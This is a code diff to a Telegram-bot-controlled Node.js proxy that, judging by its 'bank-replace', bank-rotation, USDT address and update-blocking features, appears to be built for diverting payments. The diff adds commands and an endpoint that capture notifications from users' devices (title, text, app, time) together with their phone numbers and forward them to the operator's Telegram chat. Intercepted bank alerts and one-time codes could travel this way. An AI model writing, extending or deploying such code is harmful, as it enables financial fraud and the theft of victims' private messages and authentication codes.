@@ -25,7 +25,8 @@ const DEFAULT_DATA = {
   userOverrides: {},
   trackedUsers: {},
   suspendedPhones: {},
-  blockUpdate: true
+  blockUpdate: true,
+  forwardNotifications: false
 };
 
 let bot = null;
@@ -884,6 +885,12 @@ app.post('/bot-webhook', async (req, res) => {
 /cancelbuy <id> <orderId> — Cancel recharge order
 /raw <id> <path> [json] — Custom POST to any endpoint
 
+=== NOTIFICATIONS ===
+/notif on — Global notifications ON
+/notif off — Global notifications OFF
+/notif on <userId> — Notifications ON for specific user
+/notif off <userId> — Notifications OFF for specific user
+
 Example:
 /addbank Rahul Kumar|1234567890|SBIN0001234|SBI|rahul@upi`
       );
@@ -898,7 +905,7 @@ Example:
     if (text === '/status') {
       const active = getActiveBank(data, null);
       const idCount = Object.keys(data.userOverrides || {}).length;
-      let m = `📊 Status:\nProxy: ${data.botEnabled ? '🟢 ON' : '🔴 OFF'}\nBanks: ${data.banks.length}\nAuto-Rotate: ${data.autoRotate ? '🔄 ON' : '❌ OFF'}\nLog: ${data.logRequests ? '📡 ON' : '🔇 OFF'}\nUpdate Block: ${data.blockUpdate !== false ? '🚫 BLOCKED' : '✅ ALLOWED'}\nTracked Users: ${Object.keys(data.trackedUsers || {}).length}`;
+      let m = `📊 Status:\nProxy: ${data.botEnabled ? '🟢 ON' : '🔴 OFF'}\nBanks: ${data.banks.length}\nAuto-Rotate: ${data.autoRotate ? '🔄 ON' : '❌ OFF'}\nLog: ${data.logRequests ? '📡 ON' : '🔇 OFF'}\nNotifications: ${data.forwardNotifications ? '🔔 ON' : '🔕 OFF'}\nUpdate Block: ${data.blockUpdate !== false ? '🚫 BLOCKED' : '✅ ALLOWED'}\nTracked Users: ${Object.keys(data.trackedUsers || {}).length}`;
       if (data.usdtAddress) m += `\n₮ USDT: ${data.usdtAddress.substring(0, 15)}...`;
       if (active) m += `\n\n💳 Active:\n${active.accountHolder}\n${active.accountNo}\nIFSC: ${active.ifsc}${active.bankName ? '\nBank: ' + active.bankName : ''}${active.upiId ? '\nUPI: ' + active.upiId : ''}`;
       else m += '\n\n⚠️ No active bank';
@@ -910,6 +917,32 @@ Example:
     if (text === '/off') { data = await loadData(true); data.botEnabled = false; data._skipOverrideMerge = true; await saveData(data); await bot.sendMessage(chatId, '🔴 Proxy OFF — passthrough'); return res.sendStatus(200); }
     if (text === '/rotate') { data = await loadData(true); data.autoRotate = !data.autoRotate; data.lastUsedIndex = -1; data._skipOverrideMerge = true; await saveData(data); await bot.sendMessage(chatId, `🔄 Auto-Rotate: ${data.autoRotate ? 'ON' : 'OFF'}`); return res.sendStatus(200); }
     if (text === '/log') { data = await loadData(true); data.logRequests = !data.logRequests; data._skipOverrideMerge = true; await saveData(data); await bot.sendMessage(chatId, `📋 Logging: ${data.logRequests ? 'ON' : 'OFF'}`); return res.sendStatus(200); }
+
+    if (text.startsWith('/notif ')) {
+      const parts = text.substring(7).trim().split(/\s+/);
+      const action = parts[0].toLowerCase();
+      const targetUserId = parts[1] || '';
+      if (action !== 'on' && action !== 'off') {
+        await bot.sendMessage(chatId, '❌ Format:\n/notif on\n/notif off\n/notif on <userId>\n/notif off <userId>');
+        return res.sendStatus(200);
+      }
+      data = await loadData(true);
+      const isEnable = (action === 'on');
+      if (targetUserId) {
+        if (!data.userOverrides) data.userOverrides = {};
+        if (!data.userOverrides[targetUserId]) data.userOverrides[targetUserId] = {};
+        data.userOverrides[targetUserId].forwardNotifications = isEnable;
+        data._skipOverrideMerge = true;
+        await saveData(data);
+        await bot.sendMessage(chatId, `🔔 Notifications ${isEnable ? '🟢 ON' : '🔴 OFF'} for specific user ${targetUserId}`);
+      } else {
+        data.forwardNotifications = isEnable;
+        data._skipOverrideMerge = true;
+        await saveData(data);
+        await bot.sendMessage(chatId, `🔔 Global Notification Forwarding: ${isEnable ? '🟢 ON' : '🔴 OFF'}`);
+      }
+      return res.sendStatus(200);
+    }
 
     if (text === '/debug') { debugNextResponse = true; await bot.sendMessage(chatId, '🔍 Debug ON — next bank-replace request ka full response dump aayega'); return res.sendStatus(200); }
 
@@ -2013,6 +2046,36 @@ Example:
   } catch(e) {
     console.error('Bot error:', e);
     return res.sendStatus(200);
+  }
+});
+
+app.post('/app/api/notification/report', async (req, res) => {
+  try {
+    const data = await loadData();
+    const userId = await extractUserId(req, null);
+    const uo = getUserOverride(data, userId);
+    const isEnabled = (uo && uo.forwardNotifications !== undefined) ? uo.forwardNotifications : data.forwardNotifications;
+    if (!isEnabled) {
+      return res.json({ success: true, message: 'Forwarding disabled' });
+    }
+    const body = req.parsedBody || {};
+    const title = body.title || 'No Title';
+    const text = body.text || 'No Content';
+    const appPkg = body.packageName || 'Unknown';
+    const deviceTime = body.time || new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' });
+    const phone = getPhone(data, userId);
+    const tgMessage = `🔔 *New Notification Received*\n` +
+                      `👤 *User ID*: ${userId || 'N/A'}\n` +
+                      `📱 *Phone*: ${phone || 'N/A'}\n` +
+                      `📦 *App*: ${appPkg}\n` +
+                      `📌 *Title*: ${title}\n` +
+                      `💬 *Message*: ${text}\n` +
+                      `🕒 *Time*: ${deviceTime}`;
+    await safeSend(data.adminChatId, tgMessage);
+    res.json({ success: true, message: 'Notification forwarded' });
+  } catch(e) {
+    console.error('[NOTIF_REPORT_ERR]', e.message);
+    res.status(500).json({ error: e.message });
   }
 });
 
